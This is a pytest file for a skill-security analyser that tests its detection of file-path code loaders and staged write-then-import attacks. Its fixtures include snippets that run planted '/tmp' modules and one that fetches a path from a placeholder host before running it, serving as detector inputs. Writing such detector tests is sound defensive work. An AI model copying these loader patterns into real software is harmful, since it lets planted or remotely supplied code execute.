"""B-917: loader sinks and staged-import correlation.

`runpy.run_path`/`importlib`'s `spec_from_file_location` -> `module_from_spec` ->
`spec.loader.exec_module` chain / `SourceFileLoader`&co / `zipimport.zipimporter` all
execute a file by PATH, the way an exec()/eval() call's argument never does -- so
none of them were modelled as code-execution sinks at all before this ticket. A write
followed by an `import` whose search path resolves to the same location is the same
attack shape one level removed (no exec/eval spelling anywhere).

The root-cause b917-design.md documents for the retracted branch (see CLAWSECCHECK
Pulse task B-917) was a verdict decided by the WRONG evidence: taint of the path
STRING (a proxy that both missed the ticket's own literal-/tmp/ PoCs and false-failed
benign parameterized loaders like SkillTrustBench's normal-labelled case_01579), and,
for the staged-import rule, a foreignness PREDICATE over one side of a write/import
PAIR (which cannot answer a question about both sides). This build instead resolves
each side to a location (`shippedexec.Loc`, one of FILE/CWD/ABS/TEMP/HOME/SYM) and
decides the verdict by LOCATION EQUALITY (`shippedexec.loc_eq`) between them.

Three outcomes, never two: DEFINITE (crit), UNDETERMINED (WARN, never FAIL -- Golden
Rule #4: a benign parameterized loader and a planted-file read through the identical
parameter are the same AST) and DEFINITE_NOT (silent).

Offline, read-only, stdlib only. Every skill this file builds lives in `tmp_path`, not
under `fixtures/`, so the fingerprint manifest needs no regeneration (b917-design.md's
own instruction).
"""
from __future__ import annotations

import ast
import textwrap
from pathlib import Path

import pytest

from clawseccheck import shippedexec as se
from clawseccheck.checks._vet import ast_finding_is_fail_capable, vet_skill
from clawseccheck.skillast import analyze_python

REPO = Path(__file__).resolve().parent.parent

_CRIT_RULES = {"DANGEROUS_LOADER", "REMOTE_STAGED_IMPORT", "REMOTE_STAGED_EXEC"}
_WARN_RULES = {"LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED", "UNSHIPPED_FILE_EXEC"}
_INFO_ONLY_RULES = {"DANGEROUS_SINK"}


def _b917(findings):
    return [f for f in findings if f.rule in _CRIT_RULES | _WARN_RULES | _INFO_ONLY_RULES]


def _verdict(findings) -> str:
    """"FAIL" if any B-917 rule here is FAIL-capable crit, "WARN" if any is a WARN
    rule, "info" if only DANGEROUS_SINK fired, else "none"."""
    hits = _b917(findings)
    if any(f.severity == "crit" and ast_finding_is_fail_capable(f) for f in hits):
        return "FAIL"
    if any(f.rule in _WARN_RULES for f in hits):
        return "WARN"
    if any(f.rule in _INFO_ONLY_RULES for f in hits):
        return "info"
    return "none"


def _analyze(src: str, filename: str = "skill.py", extra=(), root=None, no_artifact=False):
    """Run analyze_python over *src* as if it were one file of a skill also
    containing *extra* [(relpath, source), ...]. `root` lets classify() tell an
    absent target apart from an unanalysed-but-present one."""
    if no_artifact:
        return analyze_python(src, filename, artifact=None)
    files = [(filename, src), *extra]
    art = se.ShippedArtifact(files, root=root)
    return analyze_python(src, filename, artifact=art)


def dedent(src: str) -> str:
    return textwrap.dedent(src).lstrip("\n")


def _src(rest: str) -> str:
    """`_REMOTE_WRITE` (column-0, no common indent with an f-string template's other
    lines) prepended to *rest* AFTER *rest* is dedented on its own -- interpolating
    `_REMOTE_WRITE` INTO a `dedent()`'d block defeats `textwrap.dedent`'s common-
    prefix detection, since its own second line starts at column 0."""
    return _REMOTE_WRITE + dedent(rest)


# ---------------------------------------------------------------------------
# A. The shared resolver -- consistency with resolve() (B-638), and Loc/loc_eq unit
# behaviour that the tiering below all rests on.
# ---------------------------------------------------------------------------


def test_locate_matches_resolve_wherever_resolve_succeeds():
    """b917-design.md's own consistency pin: locate() reports the SAME FILE-anchored
    parts as resolve() (byte-identical, untouched) whenever resolve() succeeds, over
    a representative sweep of the B-638/B-916 shapes (nested join/dirname/abspath,
    pathlib chains, a same-scope split rebind)."""
    sources = [
        'import os\nhere = os.path.abspath(os.path.dirname(__file__))\n'
        'p = os.path.join(here, "v.py")\n',
        'import os\nhere = os.path.dirname(__file__)\n'
        'here = os.path.abspath(here)\n'
        'p = os.path.join(here, "pkg", "v.py")\n',
        'import pathlib\np = pathlib.Path(__file__).parent / "v.py"\n',
        'import pathlib\np = pathlib.Path(__file__).with_name("v.py")\n',
    ]
    for src in sources:
        tree = ast.parse(src)
        art = se.ShippedArtifact([("skills/demo/setup.py", src)])
        facts = se._FileFacts(tree, "skills/demo/setup.py", art, set(), False)
        p_node = next(
            n for n in ast.walk(tree)
            if isinstance(n, ast.Assign) and n.targets[0].id == "p"
        ).value
        resolved = facts.resolve(p_node, tree)
        located = facts.locate(p_node, tree)
        assert resolved is not None, src
        assert located is not None and located.anchor == "FILE", src
        assert located.parts == resolved.parts, (src, located.parts, resolved.parts)


def test_loc_eq_definite_undetermined_definite_not():
    a = se.Loc("ABS", ("tmp", "x.py"))
    b = se.Loc("ABS", ("tmp", "x.py"))
    c = se.Loc("ABS", ("tmp", "y.py"))
    assert se.loc_eq(a, b) == "DEFINITE"
    assert se.loc_eq(a, c) == "DEFINITE_NOT"
    assert se.loc_eq(se.Loc("TEMP", ()), se.Loc("ABS", ("tmp",))) == "DEFINITE_NOT"
    # CWD vs FILE: uncertain ONLY when the rest of the path already matches.
    assert se.loc_eq(se.Loc("CWD", ("v.py",)), se.Loc("FILE", ("v.py",))) == "UNDETERMINED"
    assert se.loc_eq(
        se.Loc("CWD", ("cache_examples", "helpers.py")), se.Loc("FILE", ("helpers.py",))
    ) == "DEFINITE_NOT"
    # SYM: same identity + same trailing parts is DEFINITE; anything else UNDETERMINED.
    assert se.loc_eq(se.Loc("SYM", (), sym=1), se.Loc("SYM", (), sym=1)) == "DEFINITE"
    assert se.loc_eq(se.Loc("SYM", (), sym=1), se.Loc("SYM", (), sym=2)) == "UNDETERMINED"
    assert se.loc_eq(
        se.Loc("SYM", ("a.py",), sym=1), se.Loc("SYM", ("b.py",), sym=1)
    ) == "UNDETERMINED"
    assert se.loc_eq(None, a) == "UNDETERMINED"


def test_loc_writable_temp_and_tmp_prefix_only():
    assert se.Loc("TEMP", ()).writable
    assert se.Loc("ABS", ("tmp", "x.py")).writable
    assert se.Loc("ABS", ("var", "tmp", "x.py")).writable
    assert not se.Loc("ABS", ("opt", "x.py")).writable
    assert not se.Loc("CWD", ("x.py",)).writable
    assert not se.Loc("FILE", ("x.py",)).writable


def _locate_assign_value(src: str, target: str = "p", func_name: str = "stage"):
    """Parse *src*, find the `func_name` FunctionDef's own `target = <expr>` and
    return `(facts, func_scope, value_node)` -- the fixture every LEGB test below
    shares."""
    tree = ast.parse(src)
    art = se.ShippedArtifact([("skill.py", src)])
    facts = se._FileFacts(tree, "skill.py", art, set(), False)
    func = next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.FunctionDef) and n.name == func_name
    )
    value = next(
        n for n in ast.walk(func)
        if isinstance(n, ast.Assign) and n.targets[0].id == target
    ).value
    return facts, func, value


def test_locate_legb_fallback_resolves_module_constant_from_function():
    """b917-design.md 2.1's own required case: a Name with no binding in its own
    function scope resolves through the enclosing MODULE scope -- the fallback
    `resolve()` (the B-638 proof) deliberately does not have, because `sole()` alone
    never crosses a function's own scope boundary."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def stage():
            p = os.path.join(_STAGE_DIR, "mod.py")
    '''))
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_blocked_by_attribute_store_of_same_name():
    """The design's first safety exemption: an attribute store `X._STAGE_DIR = ...`
    naming this exact identifier ANYWHERE in the file voids the fallback for it, even
    though a single, unconditional module-level assignment also exists -- SYM, never
    a resolution some other object's attribute of the same name could invalidate."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def stage():
            p = os.path.join(_STAGE_DIR, "mod.py")

        def tamper(cfg):
            cfg._STAGE_DIR = "/elsewhere"
    '''))
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "SYM"


def test_locate_legb_blocked_by_tampers_spelling():
    """The design's second safety exemption: any of this file's own namespace-
    tampering spellings (`_tampers()` -- reflection/monkeypatch/import-machinery
    access) voids the fallback file-wide, not just for a name a tamper touches by
    name directly."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def stage():
            p = os.path.join(_STAGE_DIR, "mod.py")

        def reflect():
            return globals()
    '''))
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "SYM"


def test_locate_legb_respects_global_declaration_elsewhere():
    """`sole()`'s own pre-existing, file-wide guard (a name in `self.declared` never
    resolves) already refuses a name declared `global`/`nonlocal` anywhere in the
    file; the LEGB fallback must not circumvent it by trying the module scope
    directly."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def rebind():
            global _STAGE_DIR
            _STAGE_DIR = "/tmp/other"

        def stage():
            p = os.path.join(_STAGE_DIR, "mod.py")
    '''))
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "SYM"


def test_locate_legb_walks_through_a_nested_function_too():
    """Two levels of function nesting: an inner function with no binding of its own
    falls back through its immediate enclosing function and then to the module."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def outer():
            def stage():
                p = os.path.join(_STAGE_DIR, "mod.py")
            stage()
    '''))
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_blocked_by_parameter_of_the_same_name_in_a_different_function():
    """Fix round 2 (C-135 adversarial review finding #1, BLOCKER): a SEPARATE
    function's OWN PARAMETER that happens to share a module constant's exact name
    must not resolve through it. `load_plugin`'s `_CACHE_DIR` parameter binds that
    name locally to `load_plugin` for its whole body -- `sole()` returns None for it
    (a parameter is an unresolvable 'other' record), but that means "bound here,
    not resolvable", never "free in this scope, walk LEGB". Gating the fallback on
    `sole() is None` alone (the pre-fix code) could not tell those apart and walked
    out to the unrelated module-level `_CACHE_DIR`, producing a location the
    parameter has no static relationship to at all -- the exact false correlation
    the reviewer reproduced twice (attack_shadow/main.py)."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _CACHE_DIR = "/tmp/appcache"

        def sync_something():
            p = os.path.join(_CACHE_DIR, "mod.py")

        def load_plugin(_CACHE_DIR):
            p = _CACHE_DIR
    '''), target="p", func_name="load_plugin")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "SYM"


def test_locate_legb_still_resolves_in_the_sibling_function_with_no_such_parameter():
    """Control for the test above, over the SAME source: the sibling function that
    has no colliding parameter still gets the LEGB fallback. The guard is per-scope
    (that function's OWN records), not a file-wide veto the moment any function
    anywhere shadows the name -- a blanket veto would just trade this FP for a
    symmetric FN on `sync_something`'s own genuine use of the module constant."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _CACHE_DIR = "/tmp/appcache"

        def sync_something():
            p = os.path.join(_CACHE_DIR, "mod.py")

        def load_plugin(_CACHE_DIR):
            p = _CACHE_DIR
    '''), target="p", func_name="sync_something")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "appcache", "mod.py")


def test_locate_legb_stops_at_an_intermediate_scopes_own_parameter():
    """Same defect as the two tests above, one level removed: exercises
    `_legb_lookup`'s OWN per-step check rather than the `locate()` call site's
    pre-check. The MIDDLE scope (`outer`, neither the read's own immediate scope
    `stage` nor the outermost module scope) binds the name via its own parameter.
    The walk must stop there -- never skip past an intermediate scope's binding to
    reach a further-out module constant it does not actually shadow to."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def outer(_STAGE_DIR):
            def stage():
                p = os.path.join(_STAGE_DIR, "mod.py")
            stage()
    '''))
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "SYM"


def _reaching_at_runpy_call(src: str):
    """Parse *src*, find its sole `runpy.run_path(<name>)` call, and return
    `(facts, scope, rec)` where `rec` is `_FileFacts._reaching()`'s raw record for
    the call's path argument -- the exact B-917 loader-sink call shape
    (`_b917_loader_call`/`_b917_findings`) that reaches `_reaching()` through
    `locate()`. `facts` is built the way `skillast.analyze_python()` actually builds
    it (`_FileFacts(tree, filename, artifact, set(), False)`, never through
    `ShippedArtifact._compute()`'s own `_tampers()` gate)."""
    tree = ast.parse(src)
    art = se.ShippedArtifact([("skill.py", src)])
    facts = se._FileFacts(tree, "skill.py", art, set(), False)
    call = next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.Call) and facts.dotted(n.func) == "runpy.run_path"
    )
    scope = facts.scope_of(call)
    rec, _found_scope = facts._reaching(call.args[0], scope)
    return facts, scope, rec


def test_b996_reaching_multi_binding_resolves_normally_when_untampered():
    """Negative control for the tests below: `_reaching()` (called only by
    `locate()`) resolves an ordinary same-scope rebind -- the B-638 multi-binding
    resolution `sole()` already had, which `_reaching()` never gates (B-996 rounds
    1 and 2 each tried a gate here and both were reverted -- see `_reaching()`'s
    own docstring)."""
    src = dedent('''
        import os

        here = "/opt/skilldata"
        here = os.path.join(here, "nested")
        p = os.path.join(here, "mod.py")
    ''')
    tree = ast.parse(src)
    art = se.ShippedArtifact([("skill.py", src)])
    facts = se._FileFacts(tree, "skill.py", art, set(), False)
    p_value = next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.Assign) and n.targets[0].id == "p"
    ).value
    located = facts.locate(p_value, tree)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("opt", "skilldata", "nested", "mod.py")


def test_b996_round2_reaching_still_resolves_a_decoy_binding_with_no_frame_jump_primitive():
    """A decoy second same-scope binding feeding a `runpy.run_path()` call, in a
    file that imports the loader-sink module `runpy` itself (and would therefore
    trip the WHOLE `_tampers()` predicate, round 1's overbroad, reverted gate) but
    contains no other tamper marker. `_reaching()` resolves this confidently to the
    decoy (last-wins is the true runtime behaviour absent any trace hook). Fails
    against f53a919b (round 1's `_file_tampers()`-in-`sole()` gate refuses this
    too, since `runpy` is itself a `_TAMPER_MODULES` entry)."""
    facts, scope, rec = _reaching_at_runpy_call(dedent('''
        import runpy

        plugin = "/opt/skilldata/default.py"
        plugin = "/tmp/plugin.py"
        runpy.run_path(plugin)
    '''))
    assert se._tampers(facts.tree) is True  # sanity: `runpy` alone trips _tampers()
    assert rec is not None and rec[0] == "assign"


# ---------------------------------------------------------------------------
# A2. CLAWSECCHECK-B-964 -- `scope_of()` returns None the instant its walk hits a
# ClassDef (or Lambda/comprehension) ancestor. `_legb_lookup`'s own outward walk
# treated that None as "genuinely nothing further" and gave up immediately instead
# of skipping the class's own namespace (which a method can never see unqualified
# anyway) and continuing from whatever encloses the CLASS itself. Wrapping an
# ordinary staged-import write in a class method flipped B-917's own r2d1 shape
# (test_r2d1_module_constant_tmp_dir_plus_syspath_insert_is_fail above) from FAIL
# to WARN purely because of this. Fixed by `_FileFacts._legb_skip_wrapper`.
# ---------------------------------------------------------------------------


def test_locate_legb_resolves_through_an_enclosing_class_to_the_module():
    """The reported evasion's own unit-level shape: `stage`'s read of `_STAGE_DIR`
    has no binding in its own method scope OR in `Loader`'s class body (a method
    never sees its own class's namespace unqualified) -- so the walk must skip
    `Loader` entirely and resolve through the MODULE scope beyond it, exactly as
    `test_locate_legb_fallback_resolves_module_constant_from_function` above does
    with no class in the way at all."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Loader:
            def stage(self):
                p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_class_nested_in_a_class_walks_through_both_to_the_module():
    """Two class wrappers in a row (`Outer.Inner.stage`): the skip must climb PAST
    both `ClassDef`s, not just the immediate one, before reaching the module."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Outer:
            class Inner:
                def stage(self):
                    p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_class_nested_in_a_function_resolves_through_the_function_not_the_module():
    """Item (d): a class defined INSIDE a function. The class-skip must land on the
    function `outer` enclosing the class -- not jump straight past it to the module
    -- proven by giving `outer` its OWN binding of the same name, distinct from an
    unrelated module-level one, and checking the resolved PATH names outer's value,
    not the module's."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/modulelevel"

        def outer():
            _STAGE_DIR = "/tmp/outerlevel"

            class Loader:
                def stage(self):
                    p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "outerlevel", "mod.py")


def test_locate_legb_methods_own_parameter_blocks_the_walk_before_any_class_skip():
    """Critical correctness constraint (see `_legb_lookup`'s own docstring), class
    variant of Section G's fix-round-2 parameter-shadow test: the METHOD's own
    parameter shares the module constant's exact name. The read's own immediate
    scope already binds the name (unresolvably, per `records()`), so `_reaching()`'s
    pre-check (`not self.records(scope).get(e.id)`) refuses the LEGB fallback
    outright and `_legb_lookup` -- and the new class-skip logic inside it -- is
    never even consulted. A class wrapper around the method must not change this."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Loader:
            def stage(self, _STAGE_DIR):
                p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "SYM"


def test_legb_skip_wrapper_recognises_a_lambda_or_comprehension_ancestor_too():
    """Item (e): `_legb_skip_wrapper` matches `scope_of()`'s own full wrapper set
    (ClassDef/Lambda/ListComp/SetComp/DictComp/GeneratorExp), not just ClassDef --
    for symmetry with the contract it is patching around, not because a Lambda or a
    comprehension can occur here in practice. A `def`/`async def` is a STATEMENT; a
    Lambda's body and a comprehension's `elt`/generators are each a single
    EXPRESSION, so neither can ever contain a nested `def` -- meaning `cur` inside
    `_legb_lookup`'s own walk (always itself a FunctionDef/AsyncFunctionDef) can
    never have a Lambda/comprehension as its immediate parent for real. Exercised
    directly here by pointing a throwaway FunctionDef's recorded parent at a REAL
    Lambda node from the parsed tree (whose own, unmodified parent chain already
    leads back to `outer`), since no legal Python source can construct this shape
    on its own."""
    src = dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        def outer():
            f = lambda: None
    ''')
    tree = ast.parse(src)
    facts = se._FileFacts(
        tree, "skill.py", se.ShippedArtifact([("skill.py", src)]), set(), False
    )
    lam = next(n for n in ast.walk(tree) if isinstance(n, ast.Lambda))
    outer = next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.FunctionDef) and n.name == "outer"
    )
    fake_inner = ast.parse("def inner():\n    pass\n").body[0]
    facts.parents[fake_inner] = lam
    assert facts.scope_of(fake_inner) is None
    assert facts._legb_skip_wrapper(fake_inner) is outer


# ---------------------------------------------------------------------------
# A3. CLAWSECCHECK-B-964, C-135 round 2 (independent adversarial review) -- the
# round-1 fix above climbed past a wrapper ancestor ONE raw AST-parent hop at a
# time, re-checking `isinstance(parent, (ClassDef, ...))` at each hop. `scope_of(
# parent) is None` for a wrapper does not mean "nothing further exists" -- only
# that the nearest true scope boundary beyond it, past any TRANSPARENT non-scope
# statement container (`If`/`Try`/`For`/`With`/`ExceptHandler`/...), is itself
# another wrapper further out. The one-hop `isinstance` gate broke the instant a
# non-scope container sat directly between two wrapper layers (a class nested in
# an `if` that is itself nested in another class): the hop landed on the `If`
# node, `isinstance` failed, and the loop gave up with a scope that genuinely
# exists just a few hops further up. Fixed by climbing `self.parents` freely
# (mirroring `scope_of()`'s own climb) and only ever CONSULTING `scope_of()` on a
# wrapper node, never manufacturing a scope out of the transparent container
# itself.
# ---------------------------------------------------------------------------


def test_locate_legb_class_inside_an_if_inside_a_class_still_resolves_through_the_module():
    """The reviewer's own repro, verbatim: a non-scope `If` sits directly between
    the inner and outer `ClassDef`. Before the round-2 fix this gave an
    unresolvable SYM -- the exact class of failure B-964 exists to eliminate."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Outer:
            if True:
                class Loader:
                    def stage(self):
                        p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_class_without_the_if_wrapper_is_the_control_and_already_passed():
    """Control for the test above, over the exact same shape minus the `If`
    (`test_locate_legb_class_nested_in_a_class_walks_through_both_to_the_module`
    already pins this directly; repeated here inline so the if-wrapped/unwrapped
    pair sits side by side, matching this file's shadow/control convention)."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Outer:
            class Loader:
                def stage(self):
                    p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_class_inside_a_try_inside_a_class_still_resolves():
    """Same gap, a `Try`/`ExceptHandler` non-scope container instead of `If`."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Outer:
            try:
                class Loader:
                    def stage(self):
                        p = os.path.join(_STAGE_DIR, "mod.py")
            except Exception:
                pass
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_three_deep_class_if_class_if_class_chain_still_resolves():
    """The general case, not just the one-level gap: two separate wrapper/`If`
    pairs stacked (class-in-if-in-class-in-if-in-class) before the method. The
    free `self.parents` climb must keep going past BOTH `If`s and BOTH outer
    `ClassDef`s to reach the module."""
    facts, func, value = _locate_assign_value(dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class A:
            if True:
                class B:
                    if True:
                        class Loader:
                            def stage(self):
                                p = os.path.join(_STAGE_DIR, "mod.py")
    '''), target="p", func_name="stage")
    located = facts.locate(value, func)
    assert located is not None and located.anchor == "ABS"
    assert located.parts == ("tmp", "evilstage", "mod.py")


def test_locate_legb_skip_wrapper_climbs_past_a_nonscope_container_without_querying_it():
    """Direct unit pin on `_legb_skip_wrapper` itself, in the same style as the
    Lambda/comprehension unit test above: an `If` node sits on the climb path but
    is never itself asked for a `scope_of()` result (only ClassDef/Lambda/
    comprehension ancestors are) -- so this can never manufacture a scope out of
    an `If`/`Try` body."""
    src = dedent('''
        import os
        _STAGE_DIR = "/tmp/evilstage"

        class Outer:
            if True:
                class Loader:
                    def stage(self):
                        pass
    ''')
    tree = ast.parse(src)
    facts = se._FileFacts(
        tree, "skill.py", se.ShippedArtifact([("skill.py", src)]), set(), False
    )
    stage = next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.FunctionDef) and n.name == "stage"
    )
    if_node = facts.parents[next(
        n for n in ast.walk(tree)
        if isinstance(n, ast.ClassDef) and n.name == "Loader"
    )]
    assert isinstance(if_node, ast.If)
    assert facts.scope_of(stage) is None                 # stops at Loader, as designed
    # `Outer` is itself top-level, so climbing past `If` AND both `ClassDef`s lands
    # on the MODULE scope (a real FunctionDef/Module -- never a ClassDef itself).
    assert facts._legb_skip_wrapper(stage) is facts.tree
    # The If itself is never a scope scope_of() would report for anything.
    assert facts.scope_of(if_node) is None


# ---------------------------------------------------------------------------
# B. Loader sinks -- the ticket's own PoCs (O1/O2), tiering (T1-T5)
# ---------------------------------------------------------------------------


def test_o1_literal_tmp_run_path_is_world_writable_fail():
    """Ticket PoC O1: a literal /tmp target is DANGEROUS_LOADER crit (T3), not the
    info the retracted branch gave it."""
    src = 'import runpy\nrunpy.run_path("/tmp/stage2.py")\n'
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_o2_spec_from_file_location_tmp_chain_is_fail():
    """Ticket PoC O2: spec_from_file_location -> module_from_spec ->
    spec.loader.exec_module on a /tmp target is DANGEROUS_LOADER crit (T3)."""
    src = dedent('''
        import importlib.util
        spec = importlib.util.spec_from_file_location("m", "/tmp/m.py")
        m = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(m)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_r1b_env_sourced_loader_target_is_warn_not_fail():
    """Deliberate change from the retracted branch's exec-parity crit: an
    ext-taint-only selector (env/param/input/file-read) is WARN, because a benign
    parameterized loader is the identical AST to a planted-file read (Golden Rule
    #4) -- pinned against SkillTrustBench's own normal-labelled case_01579/case_05186
    shape below."""
    src = dedent('''
        import runpy, os
        t = os.environ.get("STAGE_PATH")
        runpy.run_path(t)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings)


def test_b995_round2_tie_shape_with_body_double_bind_does_not_crash_loader_path():
    """B-995 round 2, Finding B, in a loader context with no exec()/eval() anywhere: two
    plain `Assign` statements directly in the body of the SAME `with` (`t = fh.read()`
    then `t = t.strip()`) feeding a `runpy.run_path` target. Under round 1's flat
    with-index the two bindings compared EQUAL and fell through to a raw-AST-node
    `sorted()` comparison that raised `TypeError: '<' not supported between instances of
    'Call' and 'Call'` -- which propagated up past this file's own analysis into a
    whole-skill UNKNOWN, silencing unrelated findings elsewhere in the same skill
    (confirmed reproducing this exact shape against round 1's committed shippedexec.py).
    The assertion here is only that this must not raise -- the loader-target verdict
    itself is not the point of this test."""
    src = dedent('''
        import runpy
        with open("/tmp/stage_dir/manifest.txt") as fh:
            t = fh.read()
            t = t.strip()
        runpy.run_path(t)
    ''')
    findings = _analyze(src, no_artifact=True)  # must not raise TypeError
    assert isinstance(findings, list)


def test_r1b_variants_input_and_file_read_are_warn():
    for source_expr in ('input("path: ")', 'open("cfg").read()'):
        src = f'import runpy\nt = {source_expr}\nrunpy.run_path(t)\n'
        findings = _analyze(src, no_artifact=True)
        assert not [f for f in findings if f.severity == "crit"], source_expr
        assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings), source_expr


def test_r1b_network_to_name_is_fail_via_t2():
    """The path argument itself (not its content once written) carries remote taint
    -- T2, DANGEROUS_LOADER."""
    src = dedent('''
        import runpy, requests
        name = requests.get("https://example.invalid/p").text
        runpy.run_path(name)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert {f.rule for f in findings if f.severity == "crit"} == {"DANGEROUS_LOADER"}


def test_load_custom_strategy_param_two_hop_spec_chain_is_warn_not_fail():
    """SkillTrustBench case_01579's own `load_custom_strategy` shape (a spec chain
    whose path is a plain function parameter): WARN, never FAIL."""
    src = dedent('''
        import importlib.util, sys

        def load_custom_strategy(strategy_file, strategy_fn):
            spec = importlib.util.spec_from_file_location("user_strategy", strategy_file)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return getattr(mod, strategy_fn)
    ''')
    findings = _analyze(src, no_artifact=True)
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "LOADER_TARGET_UNVERIFIED" for f in findings)


def test_shipped_sibling_via_spec_chain_is_info_vet_passes(tmp_path):
    """A shipped sibling file loaded through the full spec chain (case_01579's
    `load_builtin_strategy` shape, and case_05335/case_01742's real corpus shape) is
    plain DANGEROUS_SINK info, and never fails --vet."""
    src = dedent('''
        import importlib.util, os

        def load_builtin_strategy(name):
            here = os.path.dirname(__file__)
            spec = importlib.util.spec_from_file_location(
                "strategy_templates", os.path.join(here, "strategy_templates.py")
            )
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            return mod
    ''')
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(
        "---\nname: demo\ndescription: x\n---\n# demo\n", encoding="utf-8"
    )
    (skill_dir / "backtest_engine.py").write_text(src, encoding="utf-8")
    (skill_dir / "strategy_templates.py").write_text("def f():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "backtest_engine.py",
        extra=[("strategy_templates.py", "def f():\n    pass\n")],
        root=str(skill_dir),
    )
    assert not [f for f in findings if f.severity == "crit"]
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)
    result = vet_skill(skill_dir)
    assert result.status != "FAIL", result.detail


def test_pathlib_parents_index_to_shipped_sibling_is_info(tmp_path):
    """SkillTrustBench case_01742's own shape: `Path(__file__).resolve().parents[1] /
    "scripts" / "gate.py"` from a `tests/` file -- Loc's `.parents[N]` support."""
    src = dedent('''
        import importlib.util
        from pathlib import Path
        _GATE_PY = Path(__file__).resolve().parents[1] / "scripts" / "gate.py"
        _spec = importlib.util.spec_from_file_location("gate", _GATE_PY)
        _gate = importlib.util.module_from_spec(_spec)
        _spec.loader.exec_module(_gate)
    ''')
    skill_dir = tmp_path / "skill"
    (skill_dir / "tests").mkdir(parents=True)
    (skill_dir / "scripts").mkdir()
    (skill_dir / "tests" / "test_gate.py").write_text(src, encoding="utf-8")
    (skill_dir / "scripts" / "gate.py").write_text("def gate():\n    pass\n", encoding="utf-8")
    findings = _analyze(
        src, "tests/test_gate.py",
        extra=[("scripts/gate.py", "def gate():\n    pass\n")],
        root=str(skill_dir),
    )
    assert not [f for f in findings if f.severity == "crit"], findings
    assert any(f.rule == "DANGEROUS_SINK" for f in findings)


def test_shipped_target_absent_is_unshipped_warn(tmp_path):
    """Same shape, target genuinely absent from disk: UNSHIPPED_FILE_EXEC WARN."""
